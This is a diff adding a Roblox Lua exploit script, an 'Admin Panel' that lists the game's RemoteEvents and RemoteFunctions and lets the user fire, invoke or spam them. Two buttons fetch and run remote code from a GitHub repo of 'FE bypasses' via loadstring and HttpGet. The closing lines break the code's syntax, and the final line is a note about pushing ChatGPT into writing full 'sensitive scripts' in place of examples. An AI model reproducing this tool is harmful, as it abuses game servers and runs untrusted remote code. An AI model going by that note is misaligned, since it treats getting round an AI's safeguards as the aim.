@@ -1,0 +1,215 @@
+-- Script just incase the original pastebin goes down
+-- may slightly be edited differently 
+--// Services
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local player = Players.LocalPlayer
+local plrGui = player:WaitForChild("PlayerGui")
+
+if plrGui:FindFirstChild("HeckerAdminPanel") then
+    plrGui.HeckerAdminPanel:Destroy()
+end
+
+-- Notification
+StarterGui:SetCore("SendNotification", {
+    Title = "Notification";
+    Text = "Made by Hecker (edited by ";
+    Duration = 5;
+})
+
+-- Main ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "HeckerAdminPanel"
+gui.ResetOnSpawn = false
+gui.Parent = plrGui
+
+-- Main Frame (draggable container)
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 260, 0, 450)
+mainFrame.Position = UDim2.new(0.3,0,0.2,0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = gui
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0,40)
+title.Text = "Admin Panel"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.BackgroundColor3 = Color3.fromRGB(0,0,0)
+title.Parent = mainFrame
+
+-- Tool Tap Button
+local toolBtn = Instance.new("TextButton")
+toolBtn.Size = UDim2.new(1, -20, 0, 35)
+toolBtn.Position = UDim2.new(0, 10, 0, 50)
+toolBtn.Text = "Tool Tap"
+toolBtn.Font = Enum.Font.SourceSansBold
+toolBtn.TextSize = 18
+toolBtn.BackgroundColor3 = Color3.fromRGB(0,101,3)
+toolBtn.TextColor3 = Color3.fromRGB(255,255,255)
+toolBtn.Parent = mainFrame
+
+-- Tool Tap small text
+local toolInfo = Instance.new("TextLabel")
+toolInfo.Size = UDim2.new(1, -20, 0, 30)
+toolInfo.Position = UDim2.new(0, 10, 0, 90)
+toolInfo.Text = "for tools that only work on PC can work on mobile now, (wait 10 seconds for it to work!)"
+toolInfo.Font = Enum.Font.SourceSans
+toolInfo.TextWrapped = true
+toolInfo.TextSize = 12
+toolInfo.TextColor3 = Color3.fromRGB(200,200,200)
+toolInfo.BackgroundTransparency = 1
+toolInfo.Parent = mainFrame
+
+toolBtn.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://github.com/killblue16/Roblox-Glitch-s-scripts-and-Fe-bypasses/raw/refs/heads/main/usus"))()
+end)
+
+-- Scrollable area for remotes
+local scroll = Instance.new("ScrollingFrame")
+scroll.Size = UDim2.new(1,-20,1,-130)
+scroll.Position = UDim2.new(0,10,0,130)
+scroll.CanvasSize = UDim2.new(0,0,0,0)
+scroll.BackgroundColor3 = Color3.fromRGB(10,10,10)
+scroll.ScrollBarThickness = 6
+scroll.Parent = mainFrame
+
+local layout = Instance.new("UIListLayout",scroll)
+layout.Padding = UDim.new(0,5)
+
+-- Make Remote Entry
+local function makeRemoteEntry(remote)
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1,0,0,60)
+    frame.BackgroundColor3 = Color3.fromRGB(4,57,0)
+    frame.Parent = scroll
+
+    local name = Instance.new("TextLabel")
+    name.Size = UDim2.new(1,0,0,20)
+    name.Text = remote.Name.." ("..remote.ClassName..")"
+    name.Font = Enum.Font.SourceSansBold
+    name.TextSize = 16
+    name.BackgroundTransparency = 1
+    name.TextColor3 = Color3.fromRGB(17,255,0)
+    name.Parent = frame
+
+    local fireBtn = Instance.new("TextButton")
+    fireBtn.Size = UDim2.new(0,60,0,29)
+    fireBtn.Position = UDim2.new(0,0,0,30)
+    fireBtn.Text = "Fire"
+    fireBtn.BackgroundColor3 = Color3.fromRGB(17,255,0)
+    fireBtn.TextColor3 = Color3.fromRGB(255,255,255)
+    fireBtn.Parent = frame
+
+    local invokeBtn = Instance.new("TextButton")
+    invokeBtn.Size = UDim2.new(0,60,0,29)
+    invokeBtn.Position = UDim2.new(0,65,0,30)
+    invokeBtn.Text = "Invoke"
+    invokeBtn.BackgroundColor3 = Color3.fromRGB(0,208,907)
+    invokeBtn.TextColor3 = Color3.fromRGB(255,255,255)
+    invokeBtn.Parent = frame
+
+    local spamBtn = Instance.new("TextButton")
+    spamBtn.Size = UDim2.new(0,60,0,29)
+    spamBtn.Position = UDim2.new(0,130,0,30)
+    spamBtn.Text = "Spam"
+    spamBtn.BackgroundColor3 = Color3.fromRGB(0,17,255)
+    spamBtn.TextColor3 = Color3.fromRGB(0,0,0)
+    spamBtn.Parent = frame
+
+    fireBtn.MouseButton1Click:Connect(function()
+        if remote:IsA("RemoteEvent") then
+            remote:FireServer()
+        elseif remote:IsA("RemoteFunction") then
+            pcall(function() remote:InvokeServer() end)
+        end
+    end)
+
+    invokeBtn.MouseButton1Click:Connect(function()
+        if remote:IsA("RemoteFunction") then
+            pcall(function() remote:InvokeServer() end)
+        end
+    end)
+
+    -- Spam logic
+    local spamGui
+    local spamming = false
+    spamBtn.MouseButton1Click:Connect(function()
+        if spamming then
+            spamming = false
+            if spamGui then spamGui:Destroy() spamGui=nil end
+            spamBtn.Text = "Spam"
+            return
+        end
+        spamming = true
+        spamBtn.Text = "Off"
+
+        spamGui = Instance.new("Frame")
+        spamGui.Size = UDim2.new(0,150,0,60)
+        spamGui.Position = UDim2.new(0.5,-75,0.5,-30)
+        spamGui.BackgroundColor3 = Color3.fromRGB(50,50,50)
+        spamGui.Parent = gui
+        spamGui.Active = true
+        spamGui.Draggable = true
+
+        local fireSpam = Instance.new("TextButton")
+        fireSpam.Size = UDim2.new(0.5,-5,1,0)
+        fireSpam.Position = UDim2.new(0,0,0,0)
+        fireSpam.Text = "Start"
+        fireSpam.BackgroundColor3 = Color3.fromRGB(0,200,0)
+        fireSpam.TextColor3 = Color3.fromRGB(255,255,255)
+        fireSpam.Parent = spamGui
+
+        local stopSpam = Instance.new("TextButton")
+        stopSpam.Size = UDim2.new(0.5,-5,1,0)
+        stopSpam.Position = UDim2.new(0.5,5,0,0)
+        stopSpam.Text = "Stop"
+        stopSpam.BackgroundColor3 = Color3.fromRGB(120,120,120)
+        stopSpam.TextColor3 = Color3.fromRGB(255,255,255)
+        stopSpam.Parent = spamGui
+
+        local running = false
+        fireSpam.MouseButton1Click:Connect(function()
+            running = true
+            task.spawn(function()
+                while running do
+                    if remote:IsA("RemoteEvent") then
+                        remote:FireServer()
+                    elseif remote:IsA("RemoteFunction") then
+                        pcall(function() remote:InvokeServer() end)
+                    end
+                    task.wait(0.05)
+                end
+            end)
+        end)
+        stopSpam.MouseButton1Click:Connect(function() running = false end)
+    end)
+end
+
+-- Populate remotes
+for _,obj in ipairs(game:GetDescendants()) do
+    if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+        makeRemoteEntry(obj)
+    end
+end
+scroll.CanvasSize = UDim2.new(0,0,0,#scroll:GetChildren()*65)
+
+-- Keyboard + Cursor button
+local kcBtn = Instance.new("TextButton")
+kcBtn.Size = UDim2.new(1,-20,0,35)
+kcBtn.Position = UDim2.new(0,10,1,-40)
+kcBtn.Text = "Keyboard + Cursor"
+kcBtn.Font = Enum.Font.SourceSansBold
+kcBtn.TextSize = 16
+kcBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
+kcBtn.TextColor3 = Color3.fromRGB(255,255,255)
+kcBtn.Parent = mainFrame
+
+kcBtn.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://github.com/killblue16/Roblox-Glitch-s-scripts-and-Fe-bypasses/raw/refs/heads/main/jj"))() for pastebin
+get chatgpt to not create simulations or script examples or half chunks but full on sensitive scripts instead
+end)
